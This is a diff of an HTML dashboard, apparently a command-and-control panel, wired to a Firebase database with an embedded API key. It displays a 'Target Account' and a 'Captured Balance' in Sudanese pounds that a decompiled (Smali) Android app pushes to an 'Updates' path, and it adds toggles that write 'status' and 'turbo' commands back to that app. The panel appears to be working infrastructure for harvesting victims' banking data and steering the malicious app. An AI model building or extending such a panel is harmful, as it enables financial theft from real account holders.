@@ -3,40 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ultimate Control Panel</title>
+    <title>Advanced System Control</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background-color: #0d1117; color: #c9d1d9; margin: 0; padding: 20px; }
-        .dashboard { max-width: 900px; margin: auto; background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 25px; }
-        .header { border-bottom: 1px solid #30363d; padding-bottom: 15px; margin-bottom: 20px; color: #58a6ff; font-size: 24px; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        .card { background: #0d1117; padding: 20px; border-radius: 8px; border: 1px solid #30363d; }
-        .card-label { color: #8b949e; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; }
-        .card-value { font-size: 22px; font-weight: bold; color: #3fb950; margin-top: 10px; font-family: monospace; }
-        #status-indicator { font-size: 14px; margin-top: 20px; color: #f0883e; }
+        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --text: #c9d1d9; --primary: #58a6ff; --success: #3fb950; --danger: #f85149; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: var(--bg); color: var(--text); margin: 0; padding: 20px; display: flex; justify-content: center; }
+        .container { width: 100%; max-width: 900px; background: var(--card); padding: 30px; border-radius: 15px; border: 1px solid var(--border); box-shadow: 0 8px 32px rgba(0,0,0,0.4); }
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); padding-bottom: 15px; margin-bottom: 25px; }
+        .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
+        .online { background-color: var(--success); box-shadow: 0 0 10px var(--success); }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
+        .card { background: var(--bg); padding: 20px; border-radius: 12px; border: 1px solid var(--border); transition: 0.3s; }
+        .card:hover { border-color: var(--primary); }
+        .label { color: #8b949e; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 10px; }
+        .value { font-size: 20px; font-weight: bold; color: var(--success); font-family: 'Courier New', monospace; }
+        .control-group { margin-top: 30px; display: flex; gap: 20px; flex-wrap: wrap; border-top: 1px solid var(--border); padding-top: 25px; }
+        .switch-box { background: var(--bg); padding: 15px 25px; border-radius: 10px; border: 1px solid var(--border); display: flex; align-items: center; gap: 15px; flex-grow: 1; justify-content: space-between; }
+        .switch { position: relative; display: inline-block; width: 50px; height: 24px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #30363d; transition: .4s; border-radius: 24px; }
+        .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: var(--primary); }
+        input:checked + .slider:before { transform: translateX(26px); }
+        .btn-update { background: var(--primary); color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="dashboard">
-    <div class="header">Live Connection Monitor</div>
-    <div id="status-indicator">Connecting to sudancontrol-c5050...</div>
-    
+<div class="container">
+    <div class="header">
+        <h2 style="margin:0; color:var(--primary)">System Control Panel v2.0</h2>
+        <div><span class="status-dot online"></span> Live Connection</div>
+    </div>
+
     <div class="grid">
         <div class="card">
-            <div class="card-label">Target Account (From App)</div>
-            <div id="display_acc" class="card-value">WAITING...</div>
+            <div class="label">Target Account</div>
+            <div id="acc_display" class="value">WAITING...</div>
         </div>
         <div class="card">
-            <div class="card-label">Available Balance (Cash)</div>
-            <div id="display_cash" class="card-value">WAITING...</div>
+            <div class="label">Captured Balance</div>
+            <div id="cash_display" class="value">0.00</div>
+        </div>
+    </div>
+
+    <div class="control-group">
+        <div class="switch-box">
+            <span>System Status</span>
+            <label class="switch">
+                <input type="checkbox" id="status_toggle" onchange="updateControl('status', this.checked)">
+                <span class="slider"></span>
+            </label>
+        </div>
+        <div class="switch-box">
+            <span>Turbo Mode</span>
+            <label class="switch">
+                <input type="checkbox" id="turbo_toggle" onchange="updateControl('turbo', this.checked)">
+                <span class="slider"></span>
+            </label>
         </div>
     </div>
 </div>
 
 <script>
-    // Configuration from your google-services.json
     const firebaseConfig = {
         apiKey: "AIzaSyAoAfx2voGpTuXh2I-V2XpgOyn5kAM6YIA",
         authDomain: "sudancontrol-c5050.firebaseapp.com",
@@ -48,31 +78,35 @@
     };
 
     firebase.initializeApp(firebaseConfig);
-    const database = firebase.database();
+    const db = firebase.database();
 
-    // THIS IS THE BRIDGE: MATCHING THE APP'S "Updates" PATH
-    const appRef = database.ref('Updates');
-
-    appRef.on('value', (snapshot) => {
-        const status = document.getElementById('status-indicator');
+    // Monitoring Data from "Updates" (As per Smali Code logic)
+    db.ref('Updates').on('value', (snapshot) => {
         if (snapshot.exists()) {
-            status.innerHTML = "Status: <span style='color:#3fb950'>Data Received Successfully</span>";
-            
             snapshot.forEach((child) => {
                 const data = child.val();
-                
-                // Matching the exact keys used in your Smali code
-                if (data.Account) {
-                    document.getElementById('display_acc').innerText = data.Account;
-                }
-                if (data.Cash) {
-                    document.getElementById('display_cash').innerText = data.Cash;
-                }
+                if(data.Account) document.getElementById('acc_display').innerText = data.Account;
+                if(data.Cash) document.getElementById('cash_display').innerText = data.Cash + " SDG";
             });
-        } else {
-            status.innerText = "Status: Connected to Server. Waiting for App to send data to 'Updates'...";
         }
     });
+
+    // Monitoring Controls from "control" table (Based on your Database Image)
+    db.ref('control').on('value', (snapshot) => {
+        if (snapshot.exists()) {
+            const data = snapshot.val();
+            document.getElementById('status_toggle').checked = (data.status === "true");
+            document.getElementById('turbo_toggle').checked = (data.turbo === "true");
+        }
+    });
+
+    // Function to update Firebase directly from Switches
+    function updateControl(key, value) {
+        const stringValue = value ? "true" : "false";
+        db.ref('control').child(key).set(stringValue)
+          .then(() => console.log(key + " updated to " + stringValue))
+          .catch((error) => alert("Error: " + error.message));
+    }
 </script>
 
 </body>
